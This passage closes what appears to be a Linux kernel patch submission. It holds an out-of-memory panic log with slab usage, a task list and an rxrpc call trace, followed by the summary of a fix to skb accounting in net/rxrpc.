[   56.821101][ T4951]  mapped:37 shmem:2716 pagetables:812
[   56.821101][ T4951]  sec_pagetables:0 bounce:0
[   56.821101][ T4951]  kernel_misc_reclaimable:0
[   56.821101][ T4951]  free:8610 free_pcp:3718 free_cma:0
[   56.822361][ T4951] Node 0 active_anon:38792kB inactive_anon:10744kB active_file:260kB inactive_file:600kB unevictable:7072kB isolated(anon):0kB isolated(file):0kB mapped:148kB dirty:0kB writeback:0kB shmem:10864kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:10112kB pagetables:3248kB sec_pagetables:0kB all_unreclaimable? yes Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[   56.822394][ T4951] Node 0 DMA free:5680kB boost:0kB min:524kB low:652kB high:780kB reserved_highatomic:0kB free_highatomic:0kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:16kB local_pcp:16kB free_cma:0kB
[   56.822425][ T4951] lowmem_reserve[]: 0 1295 1295 1295 1295
[   56.822443][ T4951] Node 0 DMA32 free:28256kB boost:14336kB min:58864kB low:69996kB high:81128kB reserved_highatomic:0kB free_highatomic:0kB active_anon:38792kB inactive_anon:10744kB active_file:260kB inactive_file:600kB unevictable:7072kB writepending:0kB zspages:0kB present:2080640kB managed:1326172kB mlocked:0kB bounce:0kB free_pcp:15148kB local_pcp:2160kB free_cma:0kB
[   56.822470][ T4951] lowmem_reserve[]: 0 0 0 0 0
[   56.822484][ T4951] Node 0 DMA: 0*4kB 1*8kB (U) 0*16kB 1*32kB (U) 0*64kB 0*128kB 0*256kB 1*512kB (U) 1*1024kB (U) 2*2048kB (UM) 0*4096kB = 5672kB
[   56.822545][ T4951] Node 0 DMA32: 18*4kB (UME) 63*8kB (E) 56*16kB (E) 45*32kB (UE) 54*64kB (UME) 51*128kB (UME) 26*256kB (UME) 17*512kB (M) 0*1024kB 0*2048kB 0*4096kB = 28256kB
[   56.822611][ T4951] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[   56.822618][ T4951] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[   56.822625][ T4951] 3046 total pagecache pages
[   56.822628][ T4951] 0 pages in swap cache
[   56.822631][ T4951] Free swap  = 0kB
[   56.822634][ T4951] Total swap = 0kB
[   56.822637][ T4951] 524158 pages RAM
[   56.822640][ T4951] 0 pages HighMem/MovableOnly
[   56.822642][ T4951] 188775 pages reserved
[   56.822645][ T4951] 0 pages cma reserved
[   56.822648][ T4951] Unreclaimable slab info:
[   56.822651][ T4951] Name                      Used          Total
[   56.822672][ T4951] bio-464                   17KB         22KB
[   56.822678][ T4951] bio-528                   19KB         31KB
[   56.822684][ T4951] bio-544                   19KB         31KB
[   56.822690][ T4951] bio-552                   19KB         31KB
[   56.822700][ T4951] TIPC                      19KB         30KB
[   56.822706][ T4951] SCTPv6                    25KB         30KB
[   56.822714][ T4951] RXRPC                     46KB         64KB
[   56.822720][ T4951] rxrpc_call_jar          1938KB       1944KB
[   56.822727][ T4951] fib6_node                 15KB         16KB
[   56.822733][ T4951] ip6_dst_cache             15KB         18KB
[   56.822739][ T4951] RAWv6                     41KB         61KB
[   56.822755][ T4951] UDPv6                     72KB         94KB
[   56.822761][ T4951] TCPv6                     33KB         60KB
[   56.822774][ T4951] t10_alua_lu_gp_cache          8KB         11KB
[   56.822781][ T4951] scsi_sense_cache           7KB          8KB
[   56.822787][ T4951] virtio_scsi_cmd           21KB         24KB
[   56.822792][ T4951] bio-136                   51KB         52KB
[   56.822801][ T4951] bio-264                   10KB         15KB
[   56.822807][ T4951] mqueue_inode_cache         19KB         30KB
[   56.822815][ T4951] f2fs_evict_inode_work          7KB          7KB
[   56.822821][ T4951] bio-272                   10KB         15KB
[   56.822826][ T4951] f2fs_bio_post_read_ctx         30KB         31KB
[   56.822863][ T4951] jfs_mp                    14KB         15KB
[   56.822873][ T4951] cifs_small_rq             28KB         32KB
[   56.822878][ T4951] cifs_request              67KB         67KB
[   56.822883][ T4951] cifs_mpx_ids               8KB         11KB
[   56.822889][ T4951] cifs_io_subrequest         42KB         47KB
[   56.822894][ T4951] cifs_io_request          105KB        111KB
[   56.822922][ T4951] nfs_commit_data           24KB         31KB
[   56.822927][ T4951] nfs_write_data            40KB         47KB
[   56.822937][ T4951] jbd2_inode                 8KB         11KB
[   56.822943][ T4951] ext4_system_zone           0KB          3KB
[   56.822949][ T4951] ext4_io_end_vec            4KB          7KB
[   56.822958][ T4951] fasync_cache               9KB         11KB
[   56.822965][ T4951] kvm_gmem_inode_cache         15KB         15KB
[   56.822972][ T4951] rpc_buffers               25KB         31KB
[   56.822978][ T4951] rpc_tasks                  8KB         11KB
[   56.822984][ T4951] UNIX-STREAM               51KB        191KB
[   56.822994][ T4951] UNIX                      57KB         95KB
[   56.823000][ T4951] tcp_bind2_bucket          14KB         16KB
[   56.823305][ T4951] tcp_bind_bucket            7KB          8KB
[   56.823312][ T4951] ip_fib_trie                7KB          8KB
[   56.823317][ T4951] ip_fib_alias              10KB         11KB
[   56.823323][ T4951] rtable                     7KB         16KB
[   56.823329][ T4951] RAW                       22KB         31KB
[   56.823334][ T4951] UDP                       63KB         95KB
[   56.823339][ T4951] request_sock_TCP           6KB         15KB
[   56.823345][ T4951] TCP                       74KB         87KB
[   56.823350][ T4951] fs_bio_integrity           7KB          8KB
[   56.823355][ T4951] hugetlbfs_inode_cache         14KB         15KB
[   56.823361][ T4951] netfs_subrequest          35KB         37KB
[   56.823367][ T4951] netfs_request            105KB        111KB
[   56.823372][ T4951] bio-288                   31KB         31KB
[   56.823388][ T4951] bio-328                   12KB         15KB
[   56.823502][ T4951] ep_head                    5KB         15KB
[   56.823510][ T4951] eventpoll_pwq             10KB         27KB
[   56.823518][ T4951] eventpoll_epi             34KB         55KB
[   56.823525][ T4951] inotify_inode_mark         35KB         39KB
[   56.823532][ T4951] bpf_fs_inode_cache         14KB         15KB
[   56.823540][ T4951] sgpool-128              1190KB       1249KB
[   56.823547][ T4951] sgpool-64                909KB        956KB
[   56.823553][ T4951] sgpool-32                596KB        598KB
[   56.823558][ T4951] sgpool-16                215KB        225KB
[   56.823660][ T4951] sgpool-8                 184KB        187KB
[   56.823666][ T4951] bio_crypt_ctx              9KB         11KB
[   56.823672][ T4951] bio_integrity_data          7KB          8KB
[   56.823677][ T4951] request_queue            195KB        211KB
[   56.823683][ T4951] blkdev_ioc                12KB         19KB
[   56.823688][ T4951] bio-200                  890KB        892KB
[   56.823693][ T4951] biovec-max              2095KB       2095KB
[   56.823699][ T4951] biovec-128               216KB        223KB
[   56.823704][ T4951] biovec-64                442KB        442KB
[   56.823709][ T4951] biovec-16                 86KB         86KB
[   56.823716][ T4951] uid_cache                 13KB         18KB
[   56.823722][ T4951] dmaengine-unmap-256         26KB         30KB
[   56.823728][ T4951] dmaengine-unmap-128         14KB         15KB
[   56.823733][ T4951] dmaengine-unmap-16          7KB          8KB
[   56.823738][ T4951] dmaengine-unmap-2          3KB          4KB
[   56.823744][ T4951] QIPCRTR                   18KB         31KB
[   56.823751][ T4951] audit_buffer              12KB         23KB
[   56.823781][ T4951] skbuff_small_head     576028KB     576706KB
[   56.823789][ T4951] skbuff_fclone_cache         26KB         37KB
[   56.823812][ T4951] skbuff_head_cache     221526KB     221805KB
[   56.823820][ T4951] configfs_dir_cache         15KB         16KB
[   56.823827][ T4951] file_lock_cache           10KB         23KB
[   56.823833][ T4951] file_lock_ctx             17KB         23KB
[   56.823839][ T4951] fsnotify_inode_mark_connector         31KB         35KB
[   56.823845][ T4951] taskstats                 22KB         31KB
[   56.823851][ T4951] mem_cgroup_per_node         91KB        153KB
[   56.823857][ T4951] mem_cgroup               105KB        150KB
[   56.823863][ T4951] proc_dir_entry           277KB        288KB
[   56.823868][ T4951] pde_opener                 3KB          3KB
[   56.823874][ T4951] seq_file                   3KB         19KB
[   56.823879][ T4951] sigqueue                   7KB         15KB
[   56.823886][ T4951] shmem_inode_cache       8363KB       8454KB
[   56.823893][ T4951] kernfs_iattrs_cache        134KB        157KB
[   56.823920][ T4951] kernfs_node_cache      17766KB      18021KB
[   56.823927][ T4951] mnt_cache                 57KB         86KB
[   56.823941][ T4951] filp                     226KB        905KB
[   56.823948][ T4951] names_cache                7KB         28KB
[   56.823953][ T4951] net_namespace             38KB         58KB
[   56.823962][ T4951] ima_iint_cache            50KB        123KB
[   56.823968][ T4951] hashtab_node             274KB        274KB
[   56.823976][ T4951] ebitmap_node            1155KB       1173KB
[   56.823983][ T4951] avtab_node              4975KB       4976KB
[   56.823991][ T4951] avc_node                  53KB         95KB
[   56.824029][ T4951] lsm_inode_cache         3012KB       3774KB
[   56.824040][ T4951] lsm_file_cache            34KB        192KB
[   56.824046][ T4951] key_jar                   42KB         47KB
[   56.824051][ T4951] uts_namespace             22KB         30KB
[   56.824063][ T4951] nsproxy                    5KB          7KB
[   56.824088][ T4951] vm_area_struct          1049KB       1548KB
[   56.824094][ T4951] fs_cache                  18KB         52KB
[   56.824101][ T4951] files_cache               71KB        191KB
[   56.824106][ T4951] task_exec_state            6KB         16KB
[   56.824117][ T4951] signal_cache             560KB       1694KB
[   56.824128][ T4951] sighand_cache            714KB       1984KB
[   56.824142][ T4951] task_struct             2492KB       3968KB
[   56.824154][ T4951] cred                      98KB        324KB
[   56.824163][ T4951] anon_vma_chain           280KB        397KB
[   56.824173][ T4951] anon_vma                 343KB        456KB
[   56.824183][ T4951] pid                      107KB        273KB
[   56.824190][ T4951] Acpi-Operand              53KB        110KB
[   56.824196][ T4951] Acpi-ParseExt             14KB         35KB
[   56.824201][ T4951] Acpi-Parse                 9KB         31KB
[   56.824207][ T4951] Acpi-State                12KB         27KB
[   56.824212][ T4951] Acpi-Namespace            28KB         32KB
[   56.824217][ T4951] numa_policy                3KB          4KB
[   56.824223][ T4951] perf_event                15KB         31KB
[   56.824228][ T4951] trace_event_file         547KB        548KB
[   56.824233][ T4951] ftrace_event_field       1057KB       1059KB
[   56.824240][ T4951] pool_workqueue           516KB        528KB
[   56.824263][ T4951] maple_node               524KB       1672KB
[   56.824270][ T4951] mm_struct                153KB        318KB
[   56.824286][ T4951] vmap_area                451KB        681KB
[   56.824318][ T4951] debug_objects_cache       1827KB       2395KB
[   56.824325][ T4951] page->ptl                 53KB        102KB
[   56.824330][ T4951] kmalloc-cg-8k            160KB        160KB
[   56.824336][ T4951] kmalloc-cg-4k            752KB        928KB
[   56.824344][ T4951] kmalloc-cg-2k            952KB       1248KB
[   56.824350][ T4951] kmalloc-cg-1k            166KB        320KB
[   56.824356][ T4951] kmalloc-cg-512            89KB        160KB
[   56.824362][ T4951] kmalloc-cg-256            59KB         80KB
[   56.824368][ T4951] kmalloc-cg-128          1039KB       1052KB
[   56.824377][ T4951] kmalloc-cg-64             54KB        264KB
[   56.824396][ T4951] kmalloc-cg-32            424KB        456KB
[   56.824433][ T4951] kmalloc-cg-16              3KB          8KB
[   56.824438][ T4951] kmalloc-cg-8               5KB          8KB
[   56.824445][ T4951] kmalloc-cg-192            27KB         28KB
[   56.825773][ T4951] kmalloc-cg-96            349KB        380KB
[   56.825786][ T4951] kmalloc-8k              1696KB       1952KB
[   56.825812][ T4951] kmalloc-4k              2672KB       6592KB
[   56.825818][ T4951] kmalloc-2k             15680KB      15784KB
[   56.825824][ T4951] kmalloc-1k              4936KB       4992KB
[   56.825837][ T4951] kmalloc-512             5388KB       6000KB
[   56.825842][ T4951] kmalloc-256             6344KB       6344KB
[   56.825852][ T4951] kmalloc-128             1027KB       1072KB
[   56.825876][ T4951] kmalloc-64              3089KB       3284KB
[   56.825897][ T4951] kmalloc-32               610KB       1136KB
[   56.825915][ T4951] kmalloc-16               520KB        536KB
[   56.825923][ T4951] kmalloc-8                379KB        400KB
[   56.825939][ T4951] kmalloc-192              690KB        848KB
[   56.825951][ T4951] kmalloc-96              1248KB       1344KB
[   56.825957][ T4951] kmem_cache_node          108KB        110KB
[   56.825962][ T4951] kmem_cache               180KB        180KB
[   56.825968][ T4951] Memory cgroup min protection 0kB -- low protection 0kB
[   56.825972][ T4951] Tasks state (memory values in pages):
[   56.825975][ T4951] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[   56.826388][ T4951] [   4992]     0  4992     7999      233      230        2         1    86016        0          -250 systemd-journal
[   56.826420][ T4951] [   5004]     0  5004     9184     2814     2812        2         0    90112        0         -1000 systemd-udevd
[   56.826440][ T4951] [   5011]     0  5011     8854     2488     2486        2         0    77824        0             0 systemd-udevd
[   56.826468][ T4951] [   5014]     0  5014     8854     2484     2482        2         0    86016        0             0 systemd-udevd
[   56.826631][ T4951] [   5031]     0  5031     8854     2489     2487        2         0    86016        0             0 systemd-udevd
[   56.826658][ T4951] [   5056]     0  5056     8854     2490     2488        2         0    77824        0             0 systemd-udevd
[   56.826674][ T4951] [   5085]     0  5085     8854     2489     2487        2         0    86016        0             0 systemd-udevd
[   56.826689][ T4951] [   5123]     0  5123     9121     2730     2728        2         0    73728        0             0 systemd-udevd
[   56.826705][ T4951] [   5171]     0  5171     8854     2489     2487        2         0    73728        0             0 systemd-udevd
[   56.826721][ T4951] [   5229]     0  5229     8854     2490     2488        2         0    86016        0             0 systemd-udevd
[   56.826746][ T4951] [   5269]     0  5269     8854     2490     2488        2         0    86016        0             0 systemd-udevd
[   56.826762][ T4951] [   5344]     0  5344     8854     2486     2484        2         0    73728        0             0 systemd-udevd
[   56.826786][ T4951] [   8827]     0  8827    55235      279      277        2         0    73728        0             0 rsyslogd
[   56.826802][ T4951] [   9209]     0  9209    24973      355      353        2         0    81920        0             0 dhclient
[   56.826819][ T4951] [   9246]     0  9246      720       34       32        2         0    40960        0             0 agetty
[   56.826838][ T4951] [   9247]     0  9247      720       34       32        2         0    49152        0             0 agetty
[   56.826854][ T4951] [   9248]     0  9248      720       34       32        2         0    49152        0             0 agetty
[   56.826869][ T4951] [   9249]     0  9249      720       34       32        2         0    49152        0             0 agetty
[   56.826885][ T4951] [   9250]     0  9250      720       34       32        2         0    49152        0             0 agetty
[   56.826900][ T4951] [   9251]     0  9251      720       35       33        2         0    45056        0             0 agetty
[   56.826929][ T4951] [   9252]     0  9252     1101       36       34        2         0    49152        0             0 agetty
[   56.826954][ T4951] [   9253]     0  9253     3340      245      243        2         0    65536        0         -1000 sshd
[   56.826970][ T4951] [   9255]     0  9255    14097      391      390        1         0    86016        0             0 nginx
[   56.826985][ T4951] [   9256]    33  9256    14191      472      470        2         0    86016        0             0 nginx
[   56.827001][ T4951] [   9257]    33  9257    14191      472      470        2         0    86016        0             0 nginx
[   56.827016][ T4951] [   9957]     0  9957     1429       98       64       34         0    57344        0             0 bash
[   56.827032][ T4951] [   9964]     0  9964     3453      294      292        2         0    73728        0             0 sshd
[   56.827047][ T4951] [   9970]  1001  9970     3453      294      292        2         0    73728        0             0 sshd
[   56.827062][ T4951] [   9971]  1001  9971   246315       61       60        1         0   106496        0             0 poc_rxrpc_mem
[   56.827077][ T4951] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[   57.119965][ T4951] CPU: 1 UID: 0 PID: 4951 Comm: krxrpcio/7001 Not tainted 7.3.0-rc1+ #3 PREEMPT(full)
[   57.121315][ T4951] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   57.122940][ T4951] Call Trace:
[   57.123386][ T4951]  <TASK>
[   57.123814][ T4951]  dump_stack_lvl+0x3c/0x200 (dump_stack_lvl at lib/dump_stack.c:124:1)
[   57.124471][ T4951]  dump_stack+0x15/0x20 (dump_stack at lib/dump_stack.c:130:1)
[   57.125031][ T4951]  vpanic+0x9bc/0xaa0 (vpanic at kernel/panic.c:652:36)
[   57.125572][ T4951]  ? __pfx_vpanic+0x10/0x10 (vpanic at kernel/panic.c:578:1)
[   57.126183][ T4951]  panic+0xc6/0xd0 (?? at kernel/panic.c:788:2)
[   57.126690][ T4951]  ? __pfx_panic+0x10/0x10 (panic at kernel/panic.c:784:1)
[   57.127265][ T4951]  ? dump_header+0x177/0x990 (dump_header at mm/oom_kill.c:475:1)
[   57.127880][ T4951]  out_of_memory+0x933/0x17a0 (constrained_alloc at mm/oom_kill.c:294:36 |  (inlined by) out_of_memory at mm/oom_kill.c:1140:19)
[   57.128501][ T4951]  ? __pfx_out_of_memory+0x10/0x10 (out_of_memory at mm/oom_kill.c:1104:1)
[   57.129275][ T4951]  __alloc_frozen_pages_noprof+0x2b34/0x3610 (__alloc_pages_may_oom at mm/page_alloc.c:4113:5 |  (inlined by) __alloc_pages_slowpath at mm/page_alloc.c:5030:9 |  (inlined by) __alloc_frozen_pages_noprof at mm/page_alloc.c:5449:9)
[   57.130185][ T4951]  ? __pfx_stack_trace_consume_entry+0x10/0x10 (stack_trace_consume_entry at kernel/stacktrace.c:86:7)
[   57.131830][ T4951]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10 (__alloc_frozen_pages_noprof at mm/page_alloc.c:5385:1)
[   57.133026][ T4951]  ? stack_trace_save+0x8d/0xc0 (stack_trace_save at kernel/stacktrace.c:123:10)
[   57.133666][ T4951]  ? __pfx_stack_trace_save+0x10/0x10 (stack_trace_save at kernel/stacktrace.c:114:1)
[   57.134371][ T4951]  ? stack_depot_save_flags+0x28/0x9c0 (stack_depot_save_flags at lib/stackdepot.c:667:15)
[   57.135141][ T4951]  ? __sanitizer_cov_trace_cmp4+0x16/0x20 (__sanitizer_cov_trace_cmp4 at kernel/kcov.c:285:1)
[   57.135950][ T4951]  ? find_match+0xc9/0x1590 (find_match at net/ipv6/route.c:775:1)
[   57.136702][ T4951]  ? kasan_save_stack+0x39/0x60 (kasan_save_stack at mm/kasan/common.c:58:9)
[   57.137340][ T4951]  ? kasan_save_track+0x14/0x40 (kasan_set_track at mm/kasan/common.c:70:22 |  (inlined by) kasan_save_track at mm/kasan/common.c:79:2)
[   57.137985][ T4951]  ? kasan_save_stack+0x49/0x60 (kasan_save_stack at mm/kasan/common.c:59:1)
[   57.138625][ T4951]  ? kasan_save_stack+0x39/0x60 (kasan_save_stack at mm/kasan/common.c:58:9)
[   57.139295][ T4951]  ? alloc_skb_with_frags+0xde/0x730 (alloc_skb at include/linux/skbuff.h:1384:9 |  (inlined by) alloc_skb_with_frags at net/core/skbuff.c:6789:8)
[   57.140048][ T4951]  ? sock_alloc_send_pskb+0x89f/0xa50 (sock_alloc_send_pskb at net/core/sock.c:3015:8)
[   57.140880][ T4951]  ? __ip6_append_data+0x2b35/0x48c0 (sock_alloc_send_skb at include/net/sock.h:1907:9 |  (inlined by) __ip6_append_data at net/ipv6/ip6_output.c:1693:11)
[   57.141758][ T4951]  ? ip6_make_skb+0x29f/0x3b0 (ip6_make_skb at net/ipv6/ip6_output.c:2096:5)
[   57.142384][ T4951]  ? udpv6_sendmsg+0x233f/0x2d60 (udpv6_sendmsg at net/ipv6/udp.c:1720:9)
[   57.143041][ T4951]  allocate_slab+0x1ce/0x640 (alloc_slab_page at mm/slub.c:3347:10 |  (inlined by) allocate_slab at mm/slub.c:3470:10)
[   57.143661][ T4951]  new_slab+0x33/0x60 (new_slab at mm/slub.c:3514:1)
[   57.144186][ T4951]  refill_objects+0xe3/0x3e0 (refill_objects at mm/slub.c:7410:9)
[   57.144993][ T4951]  ? __pcs_replace_empty_main+0x144/0x670 (local_lock_release at include/linux/local_lock_internal.h:62:2 |  (inlined by) __pcs_replace_empty_main at mm/slub.c:4762:2)
[   57.145946][ T4951]  __pcs_replace_empty_main+0x2f9/0x670 (refill_sheaf at mm/slub.c:2888:14 |  (inlined by) __pcs_replace_empty_main at mm/slub.c:4774:6)
[   57.146672][ T4951]  kmem_cache_alloc_node_noprof+0x5b0/0x7a0 (alloc_from_pcs at mm/slub.c:4850:9 |  (inlined by) slab_alloc_node at mm/slub.c:4984:11 |  (inlined by) kmem_cache_alloc_node_noprof at mm/slub.c:5068:8)
[   57.147503][ T4951]  ? kmalloc_reserve+0x14e/0x360 (kmalloc_reserve at net/core/skbuff.c:618:9)
[   57.148159][ T4951]  kmalloc_reserve+0x14e/0x360 (kmalloc_reserve at net/core/skbuff.c:618:9)
[   57.148892][ T4951]  __alloc_skb+0x193/0x750 (__alloc_skb at net/core/skbuff.c:715:9)
[   57.149529][ T4951]  ? __alloc_skb+0x5d6/0x750 (local_bh_disable at include/linux/bottom_half.h:20:2 |  (inlined by) __alloc_skb at net/core/skbuff.c:697:3)
[   57.150144][ T4951]  ? __pfx___alloc_skb+0x10/0x10 (__alloc_skb at net/core/skbuff.c:676:1)
[   57.151168][ T4951]  alloc_skb_with_frags+0xde/0x730 (alloc_skb at include/linux/skbuff.h:1384:9 |  (inlined by) alloc_skb_with_frags at net/core/skbuff.c:6789:8)
[   57.152015][ T4951]  ? __local_bh_enable_ip+0xaa/0x130 (native_irq_enable at arch/x86/include/asm/irqflags.h:42:2 |  (inlined by) arch_local_irq_enable at arch/x86/include/asm/irqflags.h:119:2 |  (inlined by) __local_bh_enable_ip at kernel/softirq.c:478:2)
[   57.153205][ T4951]  ? __sanitizer_cov_trace_switch+0x54/0xa0 (__sanitizer_cov_trace_switch at kernel/kcov.c:346:16)
[   57.154029][ T4951]  sock_alloc_send_pskb+0x89f/0xa50 (sock_alloc_send_pskb at net/core/sock.c:3015:8)
[   57.154715][ T4951]  ? find_held_lock+0x31/0x90 (find_held_lock at kernel/locking/lockdep.c:5367:5)
[   57.155357][ T4951]  ? __this_cpu_preempt_check+0x13/0x20 (__this_cpu_preempt_check at lib/smp_processor_id.c:65:1)
[   57.156081][ T4951]  ? __pfx_sock_alloc_send_pskb+0x10/0x10 (sock_alloc_send_pskb at net/core/sock.c:2988:1)
[   57.156803][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   57.157574][ T4951]  ? ipv6_dev_get_saddr+0x365/0xd40 (ipv6_dev_get_saddr at net/ipv6/addrconf.c:1825:1)
[   57.158246][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   57.158880][ T4951]  __ip6_append_data+0x2b35/0x48c0 (sock_alloc_send_skb at include/net/sock.h:1907:9 |  (inlined by) __ip6_append_data at net/ipv6/ip6_output.c:1693:11)
[   57.159586][ T4951]  ? __pfx_ip_generic_getfrag+0x10/0x10 (ip_generic_getfrag at net/ipv4/ip_output.c:937:1)
[   57.160279][ T4951]  ? __pfx___ip6_append_data+0x10/0x10 (__ip6_append_data at net/ipv6/ip6_output.c:1459:1)
[   57.160991][ T4951]  ? __sanitizer_cov_trace_const_cmp4+0x16/0x20 (__sanitizer_cov_trace_const_cmp4 at kernel/kcov.c:312:1)
[   57.162018][ T4951]  ? ip6_setup_cork+0x5d7/0x14b0 (ip6_setup_cork at net/ipv6/ip6_output.c:1449:1)
[   57.162673][ T4951]  ip6_make_skb+0x29f/0x3b0 (ip6_make_skb at net/ipv6/ip6_output.c:2096:5)
[   57.163339][ T4951]  ? __pfx_ip_generic_getfrag+0x10/0x10 (ip_generic_getfrag at net/ipv4/ip_output.c:937:1)
[   57.164026][ T4951]  ? __pfx_ip6_make_skb+0x10/0x10 (ip6_make_skb at net/ipv6/ip6_output.c:2070:1)
[   57.164663][ T4951]  ? __this_cpu_preempt_check+0x13/0x20 (__this_cpu_preempt_check at lib/smp_processor_id.c:65:1)
[   57.165495][ T4951]  udpv6_sendmsg+0x233f/0x2d60 (udpv6_sendmsg at net/ipv6/udp.c:1720:9)
[   57.166207][ T4951]  ? udpv6_sendmsg+0x233f/0x2d60 (udpv6_sendmsg at net/ipv6/udp.c:1720:9)
[   57.166846][ T4951]  ? __pfx_udpv6_sendmsg+0x10/0x10 (udpv6_sendmsg at net/ipv6/udp.c:1473:1)
[   57.167483][ T4951]  ? ret_from_fork_asm+0x1a/0x30 (ret_from_fork_asm at arch/x86/entry/entry_64.S:255:0)
[   57.168102][ T4951]  ? stack_trace_save+0x8d/0xc0 (stack_trace_save at kernel/stacktrace.c:123:10)
[   57.168716][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   57.169356][ T4951]  ? kasan_save_stack+0x49/0x60 (kasan_save_stack at mm/kasan/common.c:59:1)
[   57.170067][ T4951]  ? kasan_save_stack+0x39/0x60 (kasan_save_stack at mm/kasan/common.c:58:9)
[   57.170684][ T4951]  ? debug_smp_processor_id+0x17/0x20 (debug_smp_processor_id at lib/smp_processor_id.c:59:1)
[   57.171428][ T4951]  ? rcu_is_watching+0x14/0xd0 (rcu_is_watching_curr_cpu at include/linux/context_tracking.h:128:25 |  (inlined by) rcu_is_watching at kernel/rcu/tree.c:753:8)
[   57.172085][ T4951]  ? __sanitizer_cov_trace_const_cmp1+0x1a/0x20 (__sanitizer_cov_trace_const_cmp1 at kernel/kcov.c:298:1)
[   57.173156][ T4951]  ? __sanitizer_cov_trace_switch+0x54/0xa0 (__sanitizer_cov_trace_switch at kernel/kcov.c:346:16)
[   57.174347][ T4951]  rxrpc_reject_packet+0x5d1/0x7e0 (do_udp_sendmsg at net/rxrpc/output.c:30:11 |  (inlined by) rxrpc_reject_packet at net/rxrpc/output.c:863:9)
[   57.175331][ T4951]  ? rxrpc_reject_packet+0x5d1/0x7e0 (do_udp_sendmsg at net/rxrpc/output.c:30:11 |  (inlined by) rxrpc_reject_packet at net/rxrpc/output.c:863:9)
[   57.176140][ T4951]  ? __pfx_rxrpc_reject_packet+0x10/0x10 (rxrpc_reject_packet at net/rxrpc/output.c:807:1)
[   57.176872][ T4951]  ? __kasan_check_write+0x14/0x20 (__kasan_check_write at mm/kasan/shadow.c:38:1)
[   57.177559][ T4951]  ? __this_cpu_preempt_check+0x13/0x20 (__this_cpu_preempt_check at lib/smp_processor_id.c:65:1)
[   57.178440][ T4951]  ? lockdep_hardirqs_on+0x7e/0x100 (lockdep_hardirqs_on at kernel/locking/lockdep.c:4488:2)
[   57.179087][ T4951]  ? debug_smp_processor_id+0x17/0x20 (debug_smp_processor_id at lib/smp_processor_id.c:59:1)
[   57.179748][ T4951]  ? rxrpc_put_peer+0xbd/0x4e0 (rxrpc_put_peer at net/rxrpc/peer_object.c:447:1)
[   57.180335][ T4951]  rxrpc_io_thread+0x1294/0x3ca0 (rxrpc_io_thread at net/rxrpc/io_thread.c:479:39)
[   57.180942][ T4951]  ? __pfx_rxrpc_io_thread+0x10/0x10 (rxrpc_io_thread at net/rxrpc/io_thread.c:431:1)
[   57.181630][ T4951]  ? kthread_affine_node+0x23d/0x310 (kthread_affine_node at kernel/kthread.c:377:2)
[   57.182433][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   57.183041][ T4951]  ? debug_smp_processor_id+0x17/0x20 (debug_smp_processor_id at lib/smp_processor_id.c:59:1)
[   57.183729][ T4951]  ? __sanitizer_cov_trace_const_cmp1+0x1a/0x20 (__sanitizer_cov_trace_const_cmp1 at kernel/kcov.c:298:1)
[   57.184547][ T4951]  ? __kthread_parkme+0x18e/0x230 (__kthread_parkme at kernel/kthread.c:285:2)
[   57.185249][ T4951]  ? __pfx_rxrpc_io_thread+0x10/0x10 (rxrpc_io_thread at net/rxrpc/io_thread.c:431:1)
[   57.186168][ T4951]  kthread+0x3e6/0x520 (kthread at drivers/block/aoe/aoecmd.c:1243:20)
[   57.186721][ T4951]  ? kthread+0x3e6/0x520 (kthread at drivers/block/aoe/aoecmd.c:1243:20)
[   57.187249][ T4951]  ? __pfx_kthread+0x10/0x10 (kthread at drivers/block/aoe/aoecmd.c:1230:1)
[   57.187823][ T4951]  ret_from_fork+0x767/0xdd0 (ret_from_fork at arch/x86/kernel/process.c:164:12)
[   57.188403][ T4951]  ? __pfx_ret_from_fork+0x10/0x10 (ret_from_fork at arch/x86/kernel/process.c:153:1)
[   57.189071][ T4951]  ? __sanitizer_cov_trace_const_cmp8+0x18/0x20 (__sanitizer_cov_trace_const_cmp8 at kernel/kcov.c:319:1)
[   57.189860][ T4951]  ? __switch_to+0x7f1/0x1150 (__switch_to at arch/x86/kernel/process_64.c:714:1)
[   57.190512][ T4951]  ? __pfx_kthread+0x10/0x10 (kthread at drivers/block/aoe/aoecmd.c:1230:1)
[   57.191144][ T4951]  ret_from_fork_asm+0x1a/0x30 (ret_from_fork_asm at arch/x86/entry/entry_64.S:255:0)
[   57.191797][ T4951]  </TASK>
[   57.193375][ T4951] Kernel Offset: disabled
[   57.194119][ T4951] ---[ end Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  rxrpc: fix encap_rcv skb accounting exhaustion

 net/rxrpc/io_thread.c    | 17 +++++++++++++++--
 net/rxrpc/local_object.c |  8 ++++++--
 2 files changed, 21 insertions(+), 4 deletions(-)

-- 
2.43.0

